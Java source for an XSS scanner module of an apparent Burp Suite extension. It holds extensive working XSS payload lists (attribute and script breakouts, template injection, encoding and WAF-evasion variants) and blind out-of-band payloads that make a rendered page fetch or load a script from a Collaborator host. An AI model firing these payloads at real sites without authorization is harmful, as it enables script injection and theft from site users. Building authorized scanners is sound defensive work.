package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.collaborator.InteractionType;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.ResponseGuard;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE: Comprehensive XSS Scanner
 *
 * Multi-phase reflected/stored XSS detection with zero false positive design:
 *
 * Phase 1: Blind OOB XSS via Collaborator (polyglot payloads that fire in deferred rendering)
 * Phase 2: Reflection detection — inject unique canary, find where/how it reflects
 * Phase 3: Context-aware breakout — generate payloads specific to the reflection context
 *           (HTML body, attribute, script, style, comment, tag name)
 * Phase 4: Encoding bypass — double-encoding, unicode, HTML entity, JS escaping
 * Phase 5: Client-side template injection (CSTI) — Angular, Vue, Svelte expressions
 * Phase 6: Framework-specific XSS — React dangerouslySetInnerHTML, jQuery .html(), etc.
 * Phase 7: WAF evasion — mutation XSS, event handler alternatives, tag obfuscation
 *
 * Confirmation requires: canary reflection + breakout payload execution evidence
 * (alert/confirm/prompt-equivalent string appears in response AND original canary was consumed).
 */
public class XssScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;
    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();

    // Unique canary prefix — 12-char random-looking string unlikely in natural content
    private static final String CANARY_PREFIX = "omn1x5s";
    private static int canaryCounter = 0;

    // ── Reflection context detection ──────────────────────────────────────────

    private enum ReflectionContext {
        HTML_BODY,           // Between tags: <div>CANARY</div>
        HTML_ATTRIBUTE_DQ,   // Inside double-quoted attribute: <input value="CANARY">
        HTML_ATTRIBUTE_SQ,   // Inside single-quoted attribute: <input value='CANARY'>
        HTML_ATTRIBUTE_UQ,   // Inside unquoted attribute: <input value=CANARY>
        SCRIPT_STRING_DQ,    // Inside JS double-quoted string: var x = "CANARY"
        SCRIPT_STRING_SQ,    // Inside JS single-quoted string: var x = 'CANARY'
        SCRIPT_TEMPLATE,     // Inside JS template literal: var x = `CANARY`
        SCRIPT_BLOCK,        // Directly in <script> block (rare): <script>CANARY</script>
        HTML_COMMENT,        // Inside HTML comment: <!-- CANARY -->
        STYLE_BLOCK,         // Inside <style> block
        TAG_NAME,            // As part of a tag name (rare)
        HREF_ATTRIBUTE,      // Inside href/src/action attribute (javascript: protocol possible)
        UNKNOWN              // Reflected but context unclear
    }

    // ── Phase 2: Canary reflection patterns ────────────────────────────────────

    // Patterns to determine reflection context around the canary
    // These are applied to the response body after locating the canary

    // ── Phase 3: Context-specific breakout payloads ────────────────────────────
    // Each payload is: { payload_template, confirmation_marker, description }
    // CANARY is replaced with the actual canary. Confirmation marker appears in response if XSS fires.

    // HTML body breakout: close tag, inject new element
    private static final String[][] HTML_BODY_PAYLOADS = {
        {"<img src=x onerror=alert(1)>", "onerror=alert(1)>", "img onerror"},
        {"<svg onload=alert(1)>", "onload=alert(1)>", "svg onload"},
        {"<svg/onload=alert(1)>", "onload=alert(1)>", "svg/onload (no space)"},
        {"<details open ontoggle=alert(1)>", "ontoggle=alert(1)>", "details ontoggle"},
        {"<body onload=alert(1)>", "onload=alert(1)>", "body onload"},
        {"<marquee onstart=alert(1)>", "onstart=alert(1)>", "marquee onstart"},
        {"<video><source onerror=alert(1)>", "onerror=alert(1)>", "video source onerror"},
        {"<input onfocus=alert(1) autofocus>", "onfocus=alert(1)", "input onfocus autofocus"},
        {"<select autofocus onfocus=alert(1)>", "onfocus=alert(1)>", "select onfocus"},
        {"<textarea onfocus=alert(1) autofocus>", "onfocus=alert(1)", "textarea onfocus"},
        {"<math><mi//xlink:href=\"javascript:alert(1)\">click", "xlink:href=\"javascript:alert(1)\"", "math xlink"},
    };

    // Attribute breakout (double quote): close attribute, inject event handler
    private static final String[][] ATTR_DQ_PAYLOADS = {
        {"\" onfocus=alert(1) autofocus=\"", "onfocus=alert(1)", "onfocus injection (DQ)"},
        {"\" onmouseover=alert(1) \"", "onmouseover=alert(1)", "onmouseover (DQ)"},
        {"\"><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close attr + img onerror"},
        {"\"><svg onload=alert(1)>", "onload=alert(1)>", "close attr + svg onload"},
        {"\" style=animation-name:x onanimationend=alert(1) \"", "onanimationend=alert(1)", "CSS animation event (DQ)"},
    };

    // Attribute breakout (single quote)
    private static final String[][] ATTR_SQ_PAYLOADS = {
        {"' onfocus=alert(1) autofocus='", "onfocus=alert(1)", "onfocus injection (SQ)"},
        {"' onmouseover=alert(1) '", "onmouseover=alert(1)", "onmouseover (SQ)"},
        {"'><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close attr + img onerror (SQ)"},
        {"'><svg onload=alert(1)>", "onload=alert(1)>", "close attr + svg onload (SQ)"},
    };

    // Attribute breakout (unquoted)
    private static final String[][] ATTR_UQ_PAYLOADS = {
        {" onfocus=alert(1) autofocus ", "onfocus=alert(1)", "onfocus injection (UQ)"},
        {"><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close tag + img onerror (UQ)"},
        {" onmouseover=alert(1) ", "onmouseover=alert(1)", "onmouseover (UQ)"},
    };

    // Script string breakout (double quote)
    private static final String[][] SCRIPT_DQ_PAYLOADS = {
        {"\";alert(1)//", ";alert(1)//", "break DQ string + alert"},
        {"\"-alert(1)-\"", "-alert(1)-", "break DQ string + arithmetic alert"},
        {"\\x3c/script\\x3e\\x3cimg src=x onerror=alert(1)\\x3e", "onerror=alert(1)", "hex escape + script close"},
        {"\";alert(1);\"", ";alert(1);", "break DQ + alert + restore"},
    };

    // Script string breakout (single quote)
    private static final String[][] SCRIPT_SQ_PAYLOADS = {
        {"';alert(1)//", ";alert(1)//", "break SQ string + alert"},
        {"'-alert(1)-'", "-alert(1)-", "break SQ string + arithmetic alert"},
        {"</script><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close script + img onerror"},
        {"';alert(1);'", ";alert(1);", "break SQ + alert + restore"},
    };

    // Script template literal breakout
    private static final String[][] SCRIPT_TEMPLATE_PAYLOADS = {
        {"${alert(1)}", "${alert(1)}", "template literal expression"},
        {"`-alert(1)-`", "-alert(1)-", "break template literal"},
        {"</script><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close script + img"},
    };

    // Script block (direct injection into script context)
    private static final String[][] SCRIPT_BLOCK_PAYLOADS = {
        {"alert(1)", "alert(1)", "direct alert in script block"},
        {";alert(1);//", "alert(1)", "semicolon prefix + alert"},
        {"</script><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close script + img onerror"},
    };

    // HTML comment breakout
    private static final String[][] COMMENT_PAYLOADS = {
        {"--><img src=x onerror=alert(1)><!--", "onerror=alert(1)>", "close comment + img onerror"},
        {"--><svg onload=alert(1)><!--", "onload=alert(1)>", "close comment + svg onload"},
    };

    // href/src attribute — javascript: protocol
    private static final String[][] HREF_PAYLOADS = {
        {"javascript:alert(1)", "javascript:alert(1)", "javascript: protocol"},
        {"javascript:alert(1)//", "javascript:alert(1)", "javascript: protocol + comment"},
        {"data:text/html,<script>alert(1)</script>", "data:text/html,<script>alert(1)</script>", "data: URI"},
        {"javascript:/**/alert(1)", "javascript:/**/alert(1)", "javascript: with comment bypass"},
    };

    // Style block breakout
    private static final String[][] STYLE_PAYLOADS = {
        {"</style><img src=x onerror=alert(1)>", "onerror=alert(1)>", "close style + img onerror"},
        {"</style><svg onload=alert(1)>", "onload=alert(1)>", "close style + svg onload"},
    };

    // ── Phase 5: Client-Side Template Injection (CSTI) ─────────────────────────
    private static final String[][] CSTI_PAYLOADS = {
        {"{{constructor.constructor('alert(1)')()}}", "{{constructor.constructor", "Angular/Vue CSTI"},
        {"{{$on.constructor('alert(1)')()}}", "{{$on.constructor", "AngularJS $on CSTI"},
        {"{{toString().constructor.constructor('alert(1)')()}}", "constructor.constructor", "Angular toString CSTI"},
        {"${alert(1)}", "${alert(1)}", "Template literal / Vue 3"},
        {"#{alert(1)}", "#{alert(1)}", "Pug/CoffeeScript CSTI"},
        {"{{_c.constructor('alert(1)')()}}", "constructor('alert(1)')", "Vue _c CSTI"},
        {"{@html '<img src=x onerror=alert(1)>'}", "onerror=alert(1)", "Svelte @html"},
    };

    // ── Phase 6: Framework-specific XSS ────────────────────────────────────────
    private static final String[][] FRAMEWORK_PAYLOADS = {
        {"<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>", "onerror=alert(1)", "React dangerouslySetInnerHTML"},
        {"<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert(1)", "Vue v-html"},
        {"<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert(1)", "Angular innerHTML binding"},
    };

    // ── Phase 7: WAF evasion payloads ──────────────────────────────────────────
    private static final String[][] EVASION_PAYLOADS = {
        {"<img src=x oNeRrOr=alert(1)>", "oNeRrOr=alert(1)>", "mixed case event handler"},
        {"<IMG SRC=x ONERROR=alert(1)>", "ONERROR=alert(1)>", "uppercase tag + event"},
        {"<img/src=x/onerror=alert(1)>", "onerror=alert(1)>", "slash separator"},
        {"<img\tsrc=x\tonerror=alert(1)>", "onerror=alert(1)>", "tab separator"},
        {"<img\nsrc=x\nonerror=alert(1)>", "onerror=alert(1)>", "newline separator"},
        {"<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "onbegin=alert(1)", "SVG animate onbegin"},
        {"<svg><set onbegin=alert(1) attributeName=x to=1>", "onbegin=alert(1)", "SVG set onbegin"},
        {"<isindex type=image src=1 onerror=alert(1)>", "onerror=alert(1)", "isindex (legacy)"},
        {"<xss id=x onfocus=alert(1) tabindex=1>", "onfocus=alert(1)", "custom tag onfocus"},
        {"<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>", "&#106;&#97;&#118;&#97;", "HTML entity encoded javascript:"},
        {"<svg><script>alert&#40;1&#41;</script>", "alert&#40;1&#41;", "HTML entity encoded alert in SVG script"},
        {"<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>", "onerror=alert(1)>", "math namespace confusion"},
        {"<svg><foreignObject><iframe srcdoc='<img src=x onerror=alert(1)>'>", "onerror=alert(1)", "SVG foreignObject + srcdoc"},
    };

    // ── Phase 1: Blind OOB XSS payloads ────────────────────────────────────────
    // Polyglot payloads designed to fire in deferred rendering contexts (email templates,
    // PDF generators, admin dashboards, log viewers, etc.)
    private static final String[][] OOB_XSS_PAYLOADS = {
        // DNS callback via img — works in HTML email, admin panels, PDF renderers
        {"<img src=http://COLLAB_PLACEHOLDER/xss>", "Blind XSS img src (HTTP)"},
        // Script tag — works if rendered in browser context
        {"<script src=http://COLLAB_PLACEHOLDER/xss.js></script>", "Blind XSS script src"},
        // SVG with fetch
        {"<svg/onload=fetch('http://COLLAB_PLACEHOLDER/xss')>", "Blind XSS svg onload fetch"},
        // CSS import — triggers when style is rendered
        {"<style>@import url(http://COLLAB_PLACEHOLDER/xss.css);</style>", "Blind XSS CSS import"},
        // Link tag — fires in <head> context
        {"<link rel=stylesheet href=http://COLLAB_PLACEHOLDER/xss.css>", "Blind XSS link stylesheet"},
        // iframe — if rendered in admin context
        {"<iframe src=http://COLLAB_PLACEHOLDER/xss></iframe>", "Blind XSS iframe src"},
        // Object tag — works in some PDF renderers and legacy browsers
        {"<object data=http://COLLAB_PLACEHOLDER/xss>", "Blind XSS object data"},
        // Background image in style attribute
        {"<div style=background-image:url(http://COLLAB_PLACEHOLDER/xss)>", "Blind XSS background-image"},
        // Input with autofocus and onfocus
        {"<input onfocus=fetch('http://COLLAB_PLACEHOLDER/xss') autofocus>", "Blind XSS input autofocus"},
        // Video poster
        {"<video poster=http://COLLAB_PLACEHOLDER/xss></video>", "Blind XSS video poster"},
        // Body background
        {"<body background=http://COLLAB_PLACEHOLDER/xss>", "Blind XSS body background"},
        // Table background
        {"<table background=http://COLLAB_PLACEHOLDER/xss>", "Blind XSS table background"},
        // XSS polyglot — covers multiple contexts
        {"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik\\x0telerik11telerik1<img/*/telerik/*/oNlOaD=fetch('http://COLLAB_PLACEHOLDER/xss')//><svg/onload=fetch('http://COLLAB_PLACEHOLDER/xss')>", "Blind XSS polyglot"},
    };

    // ── Encoding bypass payloads (Phase 4) ─────────────────────────────────────
    private static final String[][] ENCODING_PAYLOADS = {
        // Double URL encoding
        {"%253Csvg%2520onload%253Dalert(1)%253E", "onload=alert(1)>", "double URL encode"},
        // Unicode escapes
        {"<svg onload=\\u0061lert(1)>", "\\u0061lert(1)>", "unicode escape in JS"},
        // HTML entities in event handler
        {"<img src=x onerror=\"&#97;lert(1)\">", "&#97;lert(1)", "HTML entity in event handler"},
        // Null byte injection
        {"<img src=x onerror=alert%00(1)>", "onerror=alert", "null byte injection"},
        // UTF-7 (legacy)
        {"+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "+ADw-script", "UTF-7 encoding"},
        // Overlong UTF-8
        {"<img src=x onerror=aler\\x74(1)>", "onerror=aler", "hex escape in event handler"},
    };

    @Override
    public String getId() { return "xss-scanner"; }

    @Override
    public String getName() { return "XSS Scanner"; }

    @Override
    public String getDescription() {
        return "Comprehensive Cross-Site Scripting detection with context-aware breakout, "
                + "encoding bypass, CSTI, framework-specific XSS, WAF evasion, and blind OOB testing.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        return runXssTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionTarget> targets = extractTargets(request);
        return runXssTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runXssTargets(HttpRequestResponse requestResponse,
                                         List<InjectionTarget> targets, String urlPath) {
        for (InjectionTarget target : targets) {
            if (Thread.currentThread().isInterrupted()) return Collections.emptyList();
            if (!dedup.markIfNew("xss-scanner", urlPath, target.name)) continue;

            try {
                testXss(requestResponse, target);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return Collections.emptyList();
            } catch (Exception e) {
                api.logging().logToError("XSS test error on " + target.name + ": " + e.getMessage());
            }
        }
        return Collections.emptyList();
    }

    // ── Main test orchestration ────────────────────────────────────────────────

    private void testXss(HttpRequestResponse original, InjectionTarget target) throws InterruptedException {
        String url = original.request().url();

        // Phase 1: Blind OOB XSS (fire-and-forget via Collaborator)
        boolean blindOobEnabled = config.getBool("xss.blindOob.enabled", true);
        if (blindOobEnabled && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testBlindOobXss(original, target);
        }

        // Phase 2: Reflection detection — inject canary, analyze context
        if (oobConfirmedParams.contains(target.name)) return;
        String canary = generateCanary();
        HttpRequestResponse canaryResult = sendPayload(original, target, canary);
        if (canaryResult == null || canaryResult.response() == null) return;

        String responseBody = canaryResult.response().bodyToString();
        if (responseBody == null) responseBody = "";

        // Check if canary is reflected at all
        if (!responseBody.contains(canary)) return; // No reflection — XSS not possible here

        // Determine reflection context(s) — canary may appear multiple times in different contexts
        List<ReflectionContext> contexts = detectReflectionContexts(responseBody, canary);

        if (contexts.isEmpty()) {
            contexts.add(ReflectionContext.UNKNOWN);
        }

        // Get baseline for comparison
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = (baseline != null && baseline.response() != null)
                ? baseline.response().bodyToString() : "";
        if (baselineBody == null) baselineBody = "";

        // Phase 3: Context-aware breakout payloads
        if (oobConfirmedParams.contains(target.name)) return;
        for (ReflectionContext ctx : contexts) {
            if (Thread.currentThread().isInterrupted()) return;
            if (oobConfirmedParams.contains(target.name)) return;

            String[][] payloads = getPayloadsForContext(ctx);
            if (payloads == null) continue;

            for (String[] payloadInfo : payloads) {
                if (Thread.currentThread().isInterrupted()) return;
                String payload = payloadInfo[0];
                String confirmMarker = payloadInfo[1];
                String desc = payloadInfo[2];

                HttpRequestResponse result = sendPayload(original, target, payload);
                if (result == null || result.response() == null) continue;

                String body = result.response().bodyToString();
                if (body == null) body = "";

                // Confirmation: the confirm marker appears in the response
                // AND it was NOT in the baseline (avoids matching static page content)
                if (body.contains(confirmMarker) && !baselineBody.contains(confirmMarker)) {
                    // Additional check: the payload should not appear fully HTML-encoded
                    // If the server HTML-encodes < > " ' the XSS doesn't fire
                    if (isFullyEncoded(body, payload)) continue;

                    Severity severity = Severity.HIGH;
                    Confidence confidence = Confidence.FIRM;

                    // If the full payload tag is rendered unescaped, confidence is CERTAIN
                    if (body.contains(payload)) {
                        confidence = Confidence.CERTAIN;
                    }

                    findingsStore.addFinding(Finding.builder("xss-scanner",
                                    "Reflected XSS: " + desc + " (" + ctx.name() + " context)",
                                    severity, confidence)
                            .url(url).parameter(target.name)
                            .evidence("Context: " + ctx.name() + " | Payload: " + payload
                                    + " | Confirmation marker found in response")
                            .description("Cross-Site Scripting detected via " + desc
                                    + ". The injected payload was reflected in a " + ctx.name()
                                    + " context with the event handler / script syntax intact.")
                            .remediation("Encode all user input using context-appropriate encoding: "
                                    + "HTML entity encoding for HTML body, JavaScript string escaping "
                                    + "for script contexts, URL encoding for href attributes. "
                                    + "Use Content-Security-Policy headers to mitigate impact.")
                            .requestResponse(result)
                            .payload(payload)
                            .responseEvidence(confirmMarker)
                            .build());
                    return; // One confirmed XSS per parameter is enough
                }

                perHostDelay();
            }
        }

        // Phase 4: Encoding bypass (if standard payloads failed)
        if (oobConfirmedParams.contains(target.name)) return;
        boolean encodingEnabled = config.getBool("xss.encodingXss.enabled", true);
        if (encodingEnabled) {
            testEncodingBypass(original, target, baselineBody);
        }

        // Phase 5: CSTI (Client-Side Template Injection)
        if (oobConfirmedParams.contains(target.name)) return;
        boolean cstiEnabled = config.getBool("xss.csti.enabled", true);
        if (cstiEnabled) {
            testCsti(original, target, baselineBody);
        }

        // Phase 6: Framework-specific XSS
        if (oobConfirmedParams.contains(target.name)) return;
        boolean frameworkEnabled = config.getBool("xss.frameworkXss.enabled", true);
        if (frameworkEnabled) {
            testFrameworkXss(original, target, baselineBody);
        }

        // Phase 7: WAF evasion (only if reflection was detected but standard payloads failed)
        if (oobConfirmedParams.contains(target.name)) return;
        boolean evasionEnabled = config.getBool("xss.evasion.enabled", true);
        if (evasionEnabled) {
            testEvasionPayloads(original, target, baselineBody);
        }
    }

    // ── Phase 1: Blind OOB XSS ────────────────────────────────────────────────

    private void testBlindOobXss(HttpRequestResponse original, InjectionTarget target) {
        String url = original.request().url();

        for (String[] payloadInfo : OOB_XSS_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return;
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];

            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();

            String collabPayload = collaboratorManager.generatePayload(
                    "xss-scanner", url, target.name,
                    "Blind XSS " + technique,
                    interaction -> {
                        for (int w = 0; w < 10 && sentRequest.get() == null; w++) {
                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                        }
                        if (interaction.type() == InteractionType.HTTP) {
                            oobConfirmedParams.add(target.name);
                        }
                        findingsStore.addFinding(Finding.builder("xss-scanner",
                                        "Blind XSS Confirmed (Out-of-Band) - " + technique,
                                        Severity.HIGH,
                                        interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Blind Cross-Site Scripting confirmed via Collaborator callback. "
                                        + "The injected payload was rendered in a deferred context (admin panel, "
                                        + "email template, PDF generator, log viewer, etc.) and triggered an "
                                        + interaction.type().name() + " callback.")
                                .remediation("Sanitize and encode all stored user input before rendering. "
                                        + "Use Content-Security-Policy to restrict script sources.")
                                .requestResponse(sentRequest.get())
                                .payload(payloadTemplate)
                                .build());
                        api.logging().logToOutput("[XSS OOB] Confirmed! " + technique
                                + " at " + url + " param=" + target.name);
                    }
            );

            if (collabPayload == null) continue;
            String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);

            try {
                sentRequest.set(sendPayload(original, target, payload));
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    // ── Phase 2: Reflection context detection ──────────────────────────────────

    private List<ReflectionContext> detectReflectionContexts(String body, String canary) {
        List<ReflectionContext> contexts = new ArrayList<>();
        int idx = 0;

        while ((idx = body.indexOf(canary, idx)) != -1) {
            ReflectionContext ctx = classifyContext(body, idx, canary.length());
            if (!contexts.contains(ctx)) {
                contexts.add(ctx);
            }
            idx += canary.length();
        }

        return contexts;
    }

    private ReflectionContext classifyContext(String body, int canaryStart, int canaryLen) {
        // Look backwards from canary position to determine context
        String before = body.substring(Math.max(0, canaryStart - 500), canaryStart);
        String after = body.substring(Math.min(body.length(), canaryStart + canaryLen),
                Math.min(body.length(), canaryStart + canaryLen + 200));

        // Check if inside HTML comment: <!-- ... CANARY ... -->
        int lastCommentOpen = before.lastIndexOf("<!--");
        int lastCommentClose = before.lastIndexOf("-->");
        if (lastCommentOpen > lastCommentClose) {
            return ReflectionContext.HTML_COMMENT;
        }

        // Check if inside <style> block
        int lastStyleOpen = lastIndexOfIgnoreCase(before, "<style");
        int lastStyleClose = lastIndexOfIgnoreCase(before, "</style");
        if (lastStyleOpen > lastStyleClose) {
            return ReflectionContext.STYLE_BLOCK;
        }

        // Check if inside <script> block
        int lastScriptOpen = lastIndexOfIgnoreCase(before, "<script");
        int lastScriptClose = lastIndexOfIgnoreCase(before, "</script");
        if (lastScriptOpen > lastScriptClose) {
            // Determine JS string context
            return classifyScriptContext(before);
        }

        // Check if inside an HTML tag (attribute context)
        int lastTagOpen = before.lastIndexOf('<');
        int lastTagClose = before.lastIndexOf('>');
        if (lastTagOpen > lastTagClose) {
            // Inside an HTML tag — check attribute context
            String inTag = before.substring(lastTagOpen);

            // Check for href/src/action attributes
            if (Pattern.compile("(?:href|src|action|formaction|data|poster|background)\\s*=\\s*[\"']?[^\"'>]*$",
                    Pattern.CASE_INSENSITIVE).matcher(inTag).find()) {
                return ReflectionContext.HREF_ATTRIBUTE;
            }

            // Check for double-quoted attribute
            int lastDQ = inTag.lastIndexOf('"');
            int lastSQ = inTag.lastIndexOf('\'');
            int lastEq = inTag.lastIndexOf('=');

            if (lastDQ > lastEq && lastDQ > lastSQ) {
                // Count quotes after the last '=' to determine if we're inside a DQ attribute
                String afterEq = inTag.substring(lastEq);
                long dqCount = afterEq.chars().filter(c -> c == '"').count();
                if (dqCount % 2 == 1) { // Odd number = inside DQ string
                    return ReflectionContext.HTML_ATTRIBUTE_DQ;
                }
            }

            if (lastSQ > lastEq && lastSQ > lastDQ) {
                String afterEq = inTag.substring(lastEq);
                long sqCount = afterEq.chars().filter(c -> c == '\'').count();
                if (sqCount % 2 == 1) {
                    return ReflectionContext.HTML_ATTRIBUTE_SQ;
                }
            }

            // Unquoted attribute (e.g., value=CANARY)
            if (lastEq >= 0 && !inTag.substring(lastEq).contains("\"")
                    && !inTag.substring(lastEq).contains("'")) {
                return ReflectionContext.HTML_ATTRIBUTE_UQ;
            }

            // Default: inside tag but can't determine exact attribute context
            return ReflectionContext.HTML_ATTRIBUTE_UQ;
        }

        // Default: HTML body context (between tags)
        return ReflectionContext.HTML_BODY;
    }

    private ReflectionContext classifyScriptContext(String beforeCanary) {
        // Find the last unescaped quote character
        char lastQuote = 0;
        boolean escaped = false;

        // Walk backwards through the text between <script> and canary
        int scriptStart = lastIndexOfIgnoreCase(beforeCanary, "<script");
        if (scriptStart < 0) scriptStart = 0;
        String scriptContent = beforeCanary.substring(scriptStart);

        // Simple state machine: track which string context we're in
        boolean inDQ = false, inSQ = false, inTemplate = false;
        for (int i = 0; i < scriptContent.length(); i++) {
            char c = scriptContent.charAt(i);
            if (escaped) { escaped = false; continue; }
            if (c == '\\') { escaped = true; continue; }

            if (!inSQ && !inTemplate && c == '"') inDQ = !inDQ;
            else if (!inDQ && !inTemplate && c == '\'') inSQ = !inSQ;
            else if (!inDQ && !inSQ && c == '`') inTemplate = !inTemplate;
        }

        if (inDQ) return ReflectionContext.SCRIPT_STRING_DQ;
        if (inSQ) return ReflectionContext.SCRIPT_STRING_SQ;
        if (inTemplate) return ReflectionContext.SCRIPT_TEMPLATE;
        return ReflectionContext.SCRIPT_BLOCK;
    }

    // ── Phase 4: Encoding bypass ───────────────────────────────────────────────

    private void testEncodingBypass(HttpRequestResponse original, InjectionTarget target,
                                     String baselineBody) throws InterruptedException {
        String url = original.request().url();
        for (String[] payloadInfo : ENCODING_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return;
            String payload = payloadInfo[0];
            String confirmMarker = payloadInfo[1];
            String desc = payloadInfo[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            if (body == null) body = "";

            if (body.contains(confirmMarker) && !baselineBody.contains(confirmMarker)) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via Encoding Bypass: " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Encoding: " + desc + " | Payload decoded and rendered in response")
                        .description("Cross-Site Scripting detected via encoding bypass (" + desc
                                + "). The server decoded the payload and rendered it without proper sanitization.")
                        .remediation("Ensure input is decoded before sanitization, not after. "
                                + "Apply output encoding as the final step before rendering.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(confirmMarker)
                        .build());
                return;
            }

            perHostDelay();
        }
    }

    // ── Phase 5: CSTI ──────────────────────────────────────────────────────────

    private void testCsti(HttpRequestResponse original, InjectionTarget target,
                           String baselineBody) throws InterruptedException {
        String url = original.request().url();

        // First check if Angular/Vue/Svelte is present in baseline
        boolean hasClientFramework = baselineBody.contains("ng-app")
                || baselineBody.contains("ng-controller")
                || baselineBody.contains("v-model")
                || baselineBody.contains("v-bind")
                || baselineBody.contains("data-ng-")
                || baselineBody.contains("x-data") // Alpine.js
                || baselineBody.contains("angular")
                || baselineBody.contains("vue.js")
                || baselineBody.contains("svelte");

        // Also try a simple Angular expression probe
        String angularCanary = "{{77777*88888}}";
        String angularExpected = "6913926216"; // 77777*88888
        HttpRequestResponse angResult = sendPayload(original, target, angularCanary);
        if (angResult != null && angResult.response() != null) {
            String aBody = angResult.response().bodyToString();
            if (aBody != null && aBody.contains(angularExpected) && !baselineBody.contains(angularExpected)) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "Client-Side Template Injection (CSTI): Angular/Vue expression evaluated",
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + angularCanary + " | Result: " + angularExpected
                                + " found in response (template expression evaluated)")
                        .description("Angular/Vue template expression was evaluated client-side. "
                                + "This confirms client-side template injection, which can be escalated to XSS.")
                        .remediation("Use textContent instead of innerHTML for rendering user input. "
                                + "Enable strict CSP. Use Angular's DomSanitizer or Vue's v-text directive.")
                        .requestResponse(angResult)
                        .payload(angularCanary)
                        .responseEvidence(angularExpected)
                        .build());
                return;
            }
        }

        // Only proceed with CSTI payloads if a client-side framework was detected
        if (!hasClientFramework) return;

        for (String[] payloadInfo : CSTI_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return;
            String payload = payloadInfo[0];
            String confirmMarker = payloadInfo[1];
            String desc = payloadInfo[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            if (body == null) body = "";

            if (body.contains(confirmMarker) && !baselineBody.contains(confirmMarker)) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "Client-Side Template Injection: " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Framework detected | Payload: " + payload
                                + " | Confirmation marker found in response")
                        .description("Client-Side Template Injection detected (" + desc
                                + "). The input is rendered inside a client-side template context "
                                + "that evaluates expressions.")
                        .remediation("Use framework-specific safe rendering: Angular DomSanitizer, "
                                + "Vue v-text, React JSX auto-escaping. Enable strict CSP.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(confirmMarker)
                        .build());
                return;
            }

            perHostDelay();
        }
    }

    // ── Phase 6: Framework-specific XSS ────────────────────────────────────────

    private void testFrameworkXss(HttpRequestResponse original, InjectionTarget target,
                                    String baselineBody) throws InterruptedException {
        String url = original.request().url();

        for (String[] payloadInfo : FRAMEWORK_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return;
